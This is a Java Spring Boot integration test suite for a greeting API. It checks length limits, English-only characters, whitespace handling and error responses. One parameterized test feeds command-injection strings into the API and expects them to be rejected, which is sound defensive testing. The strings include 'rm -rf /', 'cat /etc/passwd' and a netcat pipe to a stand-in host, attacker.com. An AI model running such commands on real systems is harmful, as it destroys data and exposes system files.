package com.sap.gtlc.security.integration;

import com.sap.gtlc.security.config.TestSecurityConfig;
import com.sap.gtlc.security.model.GreetingRequest;
import com.sap.gtlc.security.model.GreetingResponse;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.context.annotation.Import;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.ActiveProfiles;

import static org.junit.jupiter.api.Assertions.*;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@ActiveProfiles("test")
@Import(TestSecurityConfig.class)
class GreetingApiIntegrationTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    void shouldCreateGreetingSuccessfully() {
        // Arrange
        GreetingRequest request = new GreetingRequest("Hello World");

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertNotNull(response.getBody());
        assertEquals("Hello, we received your message: Hello World.", response.getBody().greeting());
    }

    @Test
    void shouldHandleMaximumWords() {
        // Arrange - exactly 10 words
        GreetingRequest request = new GreetingRequest("one two three four five six seven eight nine ten");

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertNotNull(response.getBody());
        assertTrue(response.getBody().greeting().contains("one two three four five six seven eight nine ten"));
    }

    @Test
    void shouldRejectExcessWords() {
        // Arrange - 11 words but under 50 chars
        GreetingRequest request = new GreetingRequest("a b c d e f g h i j k");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        assertTrue(response.getBody().contains("Word count"));
    }

    @Test
    void shouldHandleMaximumCharacters() {
        // 50 chars, 10 words (max word length 6 chars)
        String message = "one two three four five six seven eight nine tenth";
        GreetingRequest request = new GreetingRequest(message);

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
    }

    @Test
    void shouldRejectExcessCharacters() {
        // 51 chars, 10 words (max word length 6 chars)
        String message = "one two three four five six seven eight nine tenths";
        GreetingRequest request = new GreetingRequest(message);

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        assertTrue(response.getBody().contains("Character count"));
    }

    @Test
    void shouldHandleMaximumWordLength() {
        // Arrange - word with exactly 12 characters
        GreetingRequest request = new GreetingRequest("introduction");

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
    }

    @Test
    void shouldRejectExcessWordLength() {
        // Arrange - word with 13 characters
        GreetingRequest request = new GreetingRequest("presentations");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        assertTrue(response.getBody().contains("13 characters"));
    }

    @Test
    void shouldRejectNonEnglishCharacters() {
        // Arrange
        GreetingRequest request = new GreetingRequest("Hello 世界");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        assertTrue(response.getBody().contains("English characters"));
    }

    @Test
    void shouldRejectAccentedCharacters() {
        // Arrange
        GreetingRequest request = new GreetingRequest("café");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "hello; rm -rf /",
        "hello && cat /etc/passwd",
        "hello | nc attacker.com",
        "hello `whoami`",
        "hello $(command)"
    })
    void shouldRejectMaliciousInput(String maliciousInput) {
        // Arrange
        GreetingRequest request = new GreetingRequest(maliciousInput);

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        assertTrue(response.getBody().contains("security-error") ||
                   response.getBody().contains("validation-error"));
    }

    @Test
    void shouldNormalizeWhitespace() {
        // Arrange
        GreetingRequest request = new GreetingRequest("  hello    world  ");

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertNotNull(response.getBody());
        assertTrue(response.getBody().greeting().contains("hello world"));
    }

    @Test
    void shouldHandleMessageWithPunctuation() {
        // Arrange
        GreetingRequest request = new GreetingRequest("Hello, world! How are you?");

        // Act
        ResponseEntity<GreetingResponse> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            GreetingResponse.class
        );

        // Assert
        assertEquals(HttpStatus.OK, response.getStatusCode());
        assertNotNull(response.getBody());
        assertTrue(response.getBody().greeting().contains("Hello, world! How are you?"));
    }

    @Test
    void shouldRejectEmptyMessage() {
        // Arrange
        GreetingRequest request = new GreetingRequest("");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
    }

    @Test
    void shouldReturnProblemDetailForErrors() {
        // Arrange
        GreetingRequest request = new GreetingRequest("one two three four five six seven eight nine ten eleven");

        // Act
        ResponseEntity<String> response = restTemplate.postForEntity(
            "/api/v1/greetings",
            request,
            String.class
        );

        // Assert
        assertEquals(HttpStatus.BAD_REQUEST, response.getStatusCode());
        String body = response.getBody();
        assertTrue(body.contains("\"type\""));
        assertTrue(body.contains("\"title\""));
        assertTrue(body.contains("\"status\""));
        assertTrue(body.contains("\"detail\""));
    }
}
